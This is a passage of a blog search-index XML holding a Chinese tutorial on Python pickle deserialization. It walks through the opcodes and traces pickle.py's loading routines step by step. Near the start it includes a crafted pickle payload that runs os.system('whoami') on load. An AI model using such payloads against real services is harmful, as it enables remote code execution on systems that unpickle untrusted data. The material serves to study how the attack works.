<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pickle反序列化</title>
      <link href="/2022/09/20/pickle-fan-xu-lie-hua/"/>
      <url>/2022/09/20/pickle-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h2><p> python3大多版本中反序列化的字符串默认版本为3号版本，我这里<code>python3.8</code>的默认版本为4 </p><p>可以使用 pickletools来进行可视化</p><pre class="line-numbers language-none"><code class="language-none">import pickleimport pickletoolsa&#x3D;b&#39;\x80\x03(cos\nsystem\nX\x06\x00\x00\x00whoamio.&#39;pickletools.dis(a)#     0: \x80 PROTO      3#     2: (    MARK#     3: c        GLOBAL     &#39;os system&#39;#    14: X        BINUNICODE &#39;whoami&#39;#    25: o        OBJ        (MARK at 2)#    26: .    STOP# highest protocol among opcodes &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>常用的opcode如下：</strong></p><table><thead><tr><th>opcode</th><th>描述</th><th>具体写法</th><th>栈上的变化</th><th>memo上的变化</th></tr></thead><tbody><tr><td>c</td><td>获取一个全局对象或import一个模块（注：会调用import语句，能够引入新的包）会加入self.stack</td><td>c[module]\n[instance]\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>o</td><td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td><td>o</td><td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>i</td><td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td><td>i[module]\n[callable]\n</td><td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td><td>无</td></tr><tr><td>N</td><td>实例化一个None</td><td>N</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>S</td><td>实例化一个字符串对象</td><td>S’xxx’\n（也可以使用双引号、’等python字符串形式）</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>V</td><td>实例化一个UNICODE字符串对象</td><td>Vxxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>I</td><td>实例化一个int对象</td><td>Ixxx\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>F</td><td>实例化一个float对象</td><td>Fx.x\n</td><td>获得的对象入栈</td><td>无</td></tr><tr><td>R</td><td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td><td>R</td><td>函数和参数出栈，函数的返回值入栈</td><td>无</td></tr><tr><td>.</td><td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td><td>.</td><td>无</td><td>无</td></tr><tr><td>(</td><td>向栈中压入一个MARK标记</td><td>(</td><td>MARK标记入栈</td><td>无</td></tr><tr><td>t</td><td>寻找栈中的上一个MARK，并组合之间的数据为元组</td><td>t</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>)</td><td>向栈中直接压入一个空元组</td><td>)</td><td>空元组入栈</td><td>无</td></tr><tr><td>l</td><td>寻找栈中的上一个MARK，并组合之间的数据为列表</td><td>l</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>]</td><td>向栈中直接压入一个空列表</td><td>]</td><td>空列表入栈</td><td>无</td></tr><tr><td>d</td><td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td><td>d</td><td>MARK标记以及被组合的数据出栈，获得的对象入栈</td><td>无</td></tr><tr><td>}</td><td>向栈中直接压入一个空字典</td><td>}</td><td>空字典入栈</td><td>无</td></tr><tr><td>p</td><td>将栈顶对象储存至memo_n（记忆栈）</td><td>pn\n</td><td>无</td><td>对象被储存</td></tr><tr><td>g</td><td>将memo_n的对象压栈</td><td>gn\n</td><td>对象被压栈</td><td>无</td></tr><tr><td>0</td><td>丢弃栈顶对象（self.stack）</td><td>0</td><td>栈顶对象被丢弃</td><td>无</td></tr><tr><td>b</td><td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td><td>b</td><td>栈上第一个元素出栈</td><td>无</td></tr><tr><td>s</td><td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td><td>s</td><td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td><td>无</td></tr><tr><td>u</td><td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td><td>u</td><td>MARK标记以及被组合的数据出栈，字典被更新</td><td>无</td></tr><tr><td>a</td><td>将栈的第一个元素append到第二个元素(列表)中</td><td>a</td><td>栈顶元素出栈，第二个元素（列表）被更新</td><td>无</td></tr><tr><td>e</td><td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td><td>e</td><td>MARK标记以及被组合的数据出栈，列表被更新</td><td>无</td></tr></tbody></table><h2 id="pickle反序列化过程"><a href="#pickle反序列化过程" class="headerlink" title="pickle反序列化过程"></a>pickle反序列化过程</h2><pre class="line-numbers language-none"><code class="language-none">import pickleimport secretclass animal:    def __init__(self):        self.animal1&#x3D;&quot;dog&quot;    def check(self):        if self.animal &#x3D;&#x3D;secret.best:            print(self.animal)            print(&#39;good&#39;)a&#x3D;pickle.dumps(animal(),protocol&#x3D;3)print(a)pickle.loads(a)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出内容：</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中第一个操作码为 <code>\x80</code></p><p>所有的反序列化操作码</p><pre class="line-numbers language-none"><code class="language-none">MARK           &#x3D; b&#39;(&#39;   # push special markobject on stackSTOP           &#x3D; b&#39;.&#39;   # every pickle ends with STOPPOP            &#x3D; b&#39;0&#39;   # discard topmost stack itemPOP_MARK       &#x3D; b&#39;1&#39;   # discard stack top through topmost markobjectDUP            &#x3D; b&#39;2&#39;   # duplicate top stack itemFLOAT          &#x3D; b&#39;F&#39;   # push float object; decimal string argumentINT            &#x3D; b&#39;I&#39;   # push integer or bool; decimal string argumentBININT         &#x3D; b&#39;J&#39;   # push four-byte signed intBININT1        &#x3D; b&#39;K&#39;   # push 1-byte unsigned intLONG           &#x3D; b&#39;L&#39;   # push long; decimal string argumentBININT2        &#x3D; b&#39;M&#39;   # push 2-byte unsigned intNONE           &#x3D; b&#39;N&#39;   # push NonePERSID         &#x3D; b&#39;P&#39;   # push persistent object; id is taken from string argBINPERSID      &#x3D; b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         &#x3D; b&#39;R&#39;   # apply callable to argtuple, both on stackSTRING         &#x3D; b&#39;S&#39;   # push string; NL-terminated string argumentBINSTRING      &#x3D; b&#39;T&#39;   # push string; counted binary string argumentSHORT_BINSTRING&#x3D; b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        &#x3D; b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE     &#x3D; b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         &#x3D; b&#39;a&#39;   # append stack top to list below itBUILD          &#x3D; b&#39;b&#39;   # call __setstate__ or __dict__.update()GLOBAL         &#x3D; b&#39;c&#39;   # push self.find_class(modname, name); 2 string argsDICT           &#x3D; b&#39;d&#39;   # build a dict from stack itemsEMPTY_DICT     &#x3D; b&#39;&#125;&#39;   # push empty dictAPPENDS        &#x3D; b&#39;e&#39;   # extend list on stack by topmost stack sliceGET            &#x3D; b&#39;g&#39;   # push item from memo on stack; index is string argBINGET         &#x3D; b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           &#x3D; b&#39;i&#39;   # build &amp; push class instanceLONG_BINGET    &#x3D; b&#39;j&#39;   # push item from memo on stack; index is 4-byte argLIST           &#x3D; b&#39;l&#39;   # build list from topmost stack itemsEMPTY_LIST     &#x3D; b&#39;]&#39;   # push empty listOBJ            &#x3D; b&#39;o&#39;   # build &amp; push class instancePUT            &#x3D; b&#39;p&#39;   # store stack top in memo; index is string argBINPUT         &#x3D; b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    &#x3D; b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        &#x3D; b&#39;s&#39;   # add key+value pair to dictTUPLE          &#x3D; b&#39;t&#39;   # build tuple from topmost stack itemsEMPTY_TUPLE    &#x3D; b&#39;)&#39;   # push empty tupleSETITEMS       &#x3D; b&#39;u&#39;   # modify dict by adding topmost key+value pairsBINFLOAT       &#x3D; b&#39;G&#39;   # push float; arg is 8-byte float encodingTRUE           &#x3D; b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.pyFALSE          &#x3D; b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO          &#x3D; b&#39;\x80&#39;  # identify pickle protocolNEWOBJ         &#x3D; b&#39;\x81&#39;  # build object by applying cls.__new__ to argtupleEXT1           &#x3D; b&#39;\x82&#39;  # push object from extension registry; 1-byte indexEXT2           &#x3D; b&#39;\x83&#39;  # ditto, but 2-byte indexEXT4           &#x3D; b&#39;\x84&#39;  # ditto, but 4-byte indexTUPLE1         &#x3D; b&#39;\x85&#39;  # build 1-tuple from stack topTUPLE2         &#x3D; b&#39;\x86&#39;  # build 2-tuple from two topmost stack itemsTUPLE3         &#x3D; b&#39;\x87&#39;  # build 3-tuple from three topmost stack itemsNEWTRUE        &#x3D; b&#39;\x88&#39;  # push TrueNEWFALSE       &#x3D; b&#39;\x89&#39;  # push FalseLONG1          &#x3D; b&#39;\x8a&#39;  # push long from &lt; 256 bytesLONG4          &#x3D; b&#39;\x8b&#39;  # push really big long_tuplesize2code &#x3D; [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES       &#x3D; b&#39;B&#39;   # push bytes; counted binary string argumentSHORT_BINBYTES &#x3D; b&#39;C&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE &#x3D; b&#39;\x8c&#39;  # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8      &#x3D; b&#39;\x8d&#39;  # push very long stringBINBYTES8        &#x3D; b&#39;\x8e&#39;  # push very long bytes stringEMPTY_SET        &#x3D; b&#39;\x8f&#39;  # push empty set on the stackADDITEMS         &#x3D; b&#39;\x90&#39;  # modify set by adding topmost stack itemsFROZENSET        &#x3D; b&#39;\x91&#39;  # build frozenset from topmost stack itemsNEWOBJ_EX        &#x3D; b&#39;\x92&#39;  # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL     &#x3D; b&#39;\x93&#39;  # same as GLOBAL but using names on the stacksMEMOIZE          &#x3D; b&#39;\x94&#39;  # store top of the stack in memoFRAME            &#x3D; b&#39;\x95&#39;  # indicate the beginning of a new frame# Protocol 5BYTEARRAY8       &#x3D; b&#39;\x96&#39;  # push bytearrayNEXT_BUFFER      &#x3D; b&#39;\x97&#39;  # push next out-of-band bufferREADONLY_BUFFER  &#x3D; b&#39;\x98&#39;  # make top of stack readonly<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入load的源代码(主要代码)</p><pre class="line-numbers language-none"><code class="language-none">        try:            while True:                key &#x3D; read(1)                if not key:                    raise EOFError                assert isinstance(key, bytes_types)                dispatch[key[0]](self)        except _Stop as stopinst:            return stopinst.valueb&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下为上述序列化字符串的反序列化过程</p><p>第一步读到 <code>\x80</code>操作码,</p><p>对应操作（识别pickle协议的操作码）通过dispatch字典索引，调用load_proto方法</p><p>如何找到对应操作，在pickle.py中搜索操作码，然后在操作码的名称中crt+b,调转到有diapatch的地方</p><p><img src="file://D:/blogBin/myblog/source/images/image-20220918162842619.png?lastModify=1663606844" alt="image-20220918162842619"></p><pre class="line-numbers language-none"><code class="language-none">def load_proto(self):    proto &#x3D; self.read(1)[0]    if not 0 &lt;&#x3D; proto &lt;&#x3D; HIGHEST_PROTOCOL:        raise ValueError(&quot;unsupported pickle protocol: %d&quot; % proto)    self.proto &#x3D; protodispatch[PROTO[0]] &#x3D; load_proto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>load_proto继续往前读取一个字符<code>\x03</code>作为协议版本号 3</p><p>第二步在读取 <code>c</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_global(self):    module &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;)#往后读到换行符作为模块名 &#x3D;&gt;__main__    name &#x3D; self.readline()[:-1].decode(&quot;utf-8&quot;)#往后读到换行符作为类名 &#x3D;&gt; animal    klass &#x3D; self.find_class(module, name) #然后进入find_class寻找类    self.append(klass) #获取模块后添加到当前栈中dispatch[GLOBAL[0]] &#x3D; load_globaldef find_class(self, module, name):    # Subclasses may override this.    sys.audit(&#39;pickle.find_class&#39;, module, name)    if self.proto &lt; 3 and self.fix_imports:        if (module, name) in _compat_pickle.NAME_MAPPING:            module, name &#x3D; _compat_pickle.NAME_MAPPING[(module, name)]        elif module in _compat_pickle.IMPORT_MAPPING:            module &#x3D; _compat_pickle.IMPORT_MAPPING[module]    __import__(module, level&#x3D;0)    if self.proto &gt;&#x3D; 4:        return _getattribute(sys.modules[module], name)[0]    else:#3号协议        return getattr(sys.modules[module], name)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sys.modules中的内容 储存内置方法和引用的模块</p><pre class="line-numbers language-none"><code class="language-none">&#123;&#39;sys&#39;: &lt;module &#39;sys&#39; (built-in)&gt;, &#39;builtins&#39;: &lt;module &#39;builtins&#39; (built-in)&gt;, &#39;_frozen_importlib&#39;: &lt;module &#39;importlib._bootstrap&#39; (frozen)&gt;, &#39;_imp&#39;: &lt;module &#39;_imp&#39; (built-in)&gt;, &#39;_thread&#39;: &lt;module &#39;_thread&#39; (built-in)&gt;, &#39;_warnings&#39;: &lt;module &#39;_warnings&#39; (built-in)&gt;, &#39;_weakref&#39;: &lt;module &#39;_weakref&#39; (built-in)&gt;, &#39;_frozen_importlib_external&#39;: &lt;module &#39;importlib._bootstrap_external&#39; (frozen)&gt;, &#39;nt&#39;: &lt;module &#39;nt&#39; (built-in)&gt;, &#39;_io&#39;: &lt;module &#39;io&#39; (built-in)&gt;, &#39;marshal&#39;: &lt;module &#39;marshal&#39; (built-in)&gt;, &#39;winreg&#39;: &lt;module &#39;winreg&#39; (built-in)&gt;, &#39;time&#39;: &lt;module &#39;time&#39; (built-in)&gt;, &#39;zipimport&#39;: &lt;module &#39;zipimport&#39; (frozen)&gt;, &#39;_codecs&#39;: &lt;module &#39;_codecs&#39; (built-in)&gt;, &#39;codecs&#39;: &lt;module &#39;codecs&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\codecs.py&#39;&gt;, &#39;encodings.aliases&#39;: &lt;module &#39;encodings.aliases&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\encodings\\aliases.py&#39;&gt;, &#39;encodings&#39;: &lt;module &#39;encodings&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\encodings\\__init__.py&#39;&gt;, &#39;encodings.utf_8&#39;: &lt;module &#39;encodings.utf_8&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\encodings\\utf_8.py&#39;&gt;, &#39;_signal&#39;: &lt;module &#39;_signal&#39; (built-in)&gt;, &#39;encodings.latin_1&#39;: &lt;module &#39;encodings.latin_1&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\encodings\\latin_1.py&#39;&gt;, &#39;_abc&#39;: &lt;module &#39;_abc&#39; (built-in)&gt;, &#39;abc&#39;: &lt;module &#39;abc&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\abc.py&#39;&gt;, &#39;io&#39;: &lt;module &#39;io&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\io.py&#39;&gt;, &#39;__main__&#39;: &lt;module &#39;__main__&#39; from &#39;D:\\newDesktop\\CTFWEB\\pickle反序列化\\test.py&#39;&gt;, &#39;_stat&#39;: &lt;module &#39;_stat&#39; (built-in)&gt;, &#39;stat&#39;: &lt;module &#39;stat&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\stat.py&#39;&gt;, &#39;_collections_abc&#39;: &lt;module &#39;_collections_abc&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\_collections_abc.py&#39;&gt;, &#39;genericpath&#39;: &lt;module &#39;genericpath&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\genericpath.py&#39;&gt;, &#39;ntpath&#39;: &lt;module &#39;ntpath&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\ntpath.py&#39;&gt;, &#39;os.path&#39;: &lt;module &#39;ntpath&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\ntpath.py&#39;&gt;, &#39;os&#39;: &lt;module &#39;os&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\os.py&#39;&gt;, &#39;_sitebuiltins&#39;: &lt;module &#39;_sitebuiltins&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\_sitebuiltins.py&#39;&gt;, &#39;_locale&#39;: &lt;module &#39;_locale&#39; (built-in)&gt;, &#39;_bootlocale&#39;: &lt;module &#39;_bootlocale&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\_bootlocale.py&#39;&gt;, &#39;_codecs_cn&#39;: &lt;module &#39;_codecs_cn&#39; (built-in)&gt;, &#39;_multibytecodec&#39;: &lt;module &#39;_multibytecodec&#39; (built-in)&gt;, &#39;encodings.gbk&#39;: &lt;module &#39;encodings.gbk&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\encodings\\gbk.py&#39;&gt;, &#39;types&#39;: &lt;module &#39;types&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\types.py&#39;&gt;, &#39;importlib._bootstrap&#39;: &lt;module &#39;importlib._bootstrap&#39; (frozen)&gt;, &#39;importlib._bootstrap_external&#39;: &lt;module &#39;importlib._bootstrap_external&#39; (frozen)&gt;, &#39;warnings&#39;: &lt;module &#39;warnings&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\warnings.py&#39;&gt;, &#39;importlib&#39;: &lt;module &#39;importlib&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\importlib\\__init__.py&#39;&gt;, &#39;importlib.machinery&#39;: &lt;module &#39;importlib.machinery&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\importlib\\machinery.py&#39;&gt;, &#39;_heapq&#39;: &lt;module &#39;_heapq&#39; (built-in)&gt;, &#39;heapq&#39;: &lt;module &#39;heapq&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\heapq.py&#39;&gt;, &#39;itertools&#39;: &lt;module &#39;itertools&#39; (built-in)&gt;, &#39;keyword&#39;: &lt;module &#39;keyword&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\keyword.py&#39;&gt;, &#39;_operator&#39;: &lt;module &#39;_operator&#39; (built-in)&gt;, &#39;operator&#39;: &lt;module &#39;operator&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\operator.py&#39;&gt;, &#39;reprlib&#39;: &lt;module &#39;reprlib&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\reprlib.py&#39;&gt;, &#39;_collections&#39;: &lt;module &#39;_collections&#39; (built-in)&gt;, &#39;collections&#39;: &lt;module &#39;collections&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\collections\\__init__.py&#39;&gt;, &#39;collections.abc&#39;: &lt;module &#39;collections.abc&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\collections\\abc.py&#39;&gt;, &#39;_functools&#39;: &lt;module &#39;_functools&#39; (built-in)&gt;, &#39;functools&#39;: &lt;module &#39;functools&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\functools.py&#39;&gt;, &#39;contextlib&#39;: &lt;module &#39;contextlib&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\contextlib.py&#39;&gt;, &#39;enum&#39;: &lt;module &#39;enum&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\enum.py&#39;&gt;, &#39;_sre&#39;: &lt;module &#39;_sre&#39; (built-in)&gt;, &#39;sre_constants&#39;: &lt;module &#39;sre_constants&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\sre_constants.py&#39;&gt;, &#39;sre_parse&#39;: &lt;module &#39;sre_parse&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\sre_parse.py&#39;&gt;, &#39;sre_compile&#39;: &lt;module &#39;sre_compile&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\sre_compile.py&#39;&gt;, &#39;copyreg&#39;: &lt;module &#39;copyreg&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\copyreg.py&#39;&gt;, &#39;re&#39;: &lt;module &#39;re&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\re.py&#39;&gt;, &#39;typing.io&#39;: &lt;class &#39;typing.io&#39;&gt;, &#39;typing.re&#39;: &lt;class &#39;typing.re&#39;&gt;, &#39;typing&#39;: &lt;module &#39;typing&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\typing.py&#39;&gt;, &#39;importlib.abc&#39;: &lt;module &#39;importlib.abc&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\importlib\\abc.py&#39;&gt;, &#39;importlib.util&#39;: &lt;module &#39;importlib.util&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\importlib\\util.py&#39;&gt;, &#39;mpl_toolkits&#39;: &lt;module &#39;mpl_toolkits&#39; (namespace)&gt;, &#39;site&#39;: &lt;module &#39;site&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site.py&#39;&gt;, &#39;_struct&#39;: &lt;module &#39;_struct&#39; (built-in)&gt;, &#39;struct&#39;: &lt;module &#39;struct&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\struct.py&#39;&gt;, &#39;_compat_pickle&#39;: &lt;module &#39;_compat_pickle&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\_compat_pickle.py&#39;&gt;, &#39;_pickle&#39;: &lt;module &#39;_pickle&#39; (built-in)&gt;, &#39;pickle&#39;: &lt;module &#39;pickle&#39; from &#39;C:\\Users\\jackbin\\AppData\\Local\\Programs\\Python\\Python39\\lib\\pickle.py&#39;&gt;, &#39;secret&#39;: &lt;module &#39;secret&#39; from &#39;D:\\newDesktop\\CTFWEB\\pickle反序列化\\secret.py&#39;&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后<code>self.append(klass)</code>添加到当前栈中,所以当前栈中有：</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三步在读取 <code>q</code>操作码</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_binput(self):    i &#x3D; self.read(1)[0]#继续读取下一个字节，赋值给i    if i &lt; 0:        raise ValueError(&quot;negative BINPUT argument&quot;)    self.memo[i] &#x3D; self.stack[-1]#将栈中的栈尾(与栈顶相对)存入记忆栈中memodispatch[BINPUT[0]] &#x3D; load_binput<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以记忆栈中<strong>存在了animal类</strong></p><pre class="line-numbers language-none"><code class="language-none">memo&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(类)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第四步在读取 <code>)</code>操作码 向当前栈中增加一个新的元组</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_empty_tuple(self):    self.append(())#向当前栈中增加一个新的元组dispatch[EMPTY_TUPLE[0]] &#x3D; load_empty_tuple<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以当前栈中有：</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;,()]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第五步在读取 <code>\x81</code>操作码 # 使用弹出两次栈，用弹出的数据创建类</p><pre class="line-numbers language-none"><code class="language-none">b&#39;\x80\x03c__main__\nanimal\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00animalq\x03X\x03\x00\x00\x00dogq\x04sb.&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对应操作</p><pre class="line-numbers language-none"><code class="language-none">def load_newobj(self):    args &#x3D; self.stack.pop() # 空元组()    cls &#x3D; self.stack.pop() # &lt;class &#39;__main__.animal&#39;&gt;    obj &#x3D; cls.__new__(cls, *args)     #__new__方法的作用是修改不可变类(int,String)等基本类都是不可变类，此处不需修改，所以传入元组    self.append(obj) 将实例化后的animal压入栈中dispatch[NEWOBJ[0]] &#x3D; load_newobj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以当前栈中有：</p><pre class="line-numbers language-none"><code class="language-none">self&#x3D;&gt; stack:[&lt;class &#39;__main__.animal&#39;&gt;(对象)]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第五步在读取 <code>q</code>操作码</p><pre class="line-numbers language-none"><code 